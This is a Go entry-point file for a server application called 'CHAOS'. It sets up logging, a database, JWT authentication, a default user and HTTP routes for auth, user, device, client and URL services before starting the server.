package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/infrastructure/database"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/internal"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/internal/environment"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/internal/middleware"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/internal/utils/system"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/internal/utils/ui"
	httpDelivery "github.com/youtrolledhahaha/XDTROLLEDAxzxx/presentation/http"
	authRepo "github.com/youtrolledhahaha/XDTROLLEDAxzxx/repositories/auth"
	deviceRepo "github.com/youtrolledhahaha/XDTROLLEDAxzxx/repositories/device"
	userRepo "github.com/youtrolledhahaha/XDTROLLEDAxzxx/repositories/user"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/services/auth"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/services/client"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/services/device"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/services/url"
	"github.com/youtrolledhahaha/XDTROLLEDAxzxx/services/user"
	"gorm.io/gorm"
)

const AppName = "CHAOS"

var Version = "dev"

type App struct {
	Logger        *logrus.Logger
	Configuration *environment.Configuration
	Router        *gin.Engine
}

func init() {
	_ = system.ClearScreen()
}

func main() {
	logger := logrus.New()
	logger.Info(`Loading environment variables`)

	if err := Setup(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error running setup`)
	}

	configuration, err := environment.Load()
	if err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error loading environment variables`)
	}

	db, err := database.NewProvider(configuration.Database)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := db.Migrate(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error migrating database`)
	}

	if err := NewApp(logger, configuration, db.Conn).Run(); err != nil {
		logger.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbClient *gorm.DB) *App {
	//repositories
	authRepository := authRepo.NewRepository(dbClient)
	userRepository := userRepo.NewRepository(dbClient)
	deviceRepository := deviceRepo.NewRepository(dbClient)

	//services
	authService := auth.NewAuthService(logger, configuration.SecretKey, authRepository)
	userService := user.NewUserService(userRepository)
	deviceService := device.NewDeviceService(deviceRepository)
	clientService := client.NewClientService(Version, configuration, authRepository, authService)
	urlService := url.NewUrlService(clientService)

	setup, err := authService.Setup()
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error preparing auth`)
	}
	jwtMiddleware, err := middleware.NewJWTMiddleware(setup.SecretKey, userService)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating jwt middleware`)
	}
	if err := userService.CreateDefaultUser(); err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating default user`)
	}

	router := httpDelivery.NewRouter()

	httpDelivery.NewController(
		configuration,
		router,
		logger,
		jwtMiddleware,
		clientService,
		authService,
		userService,
		deviceService,
		urlService,
	)

	return &App{
		Configuration: configuration,
		Logger:        logger,
		Router:        router,
	}
}

func Setup() error {
	return system.CreateDirs(internal.TempDirectory, internal.DatabaseDirectory)
}

func (a *App) Run() error {
	ui.ShowMenu(Version, a.Configuration.Server.Port)

	a.Logger.WithFields(logrus.Fields{`version`: Version, `port`: a.Configuration.Server.Port}).Info(`Starting `, AppName)

	return httpDelivery.NewServer(a.Router, a.Configuration)
}
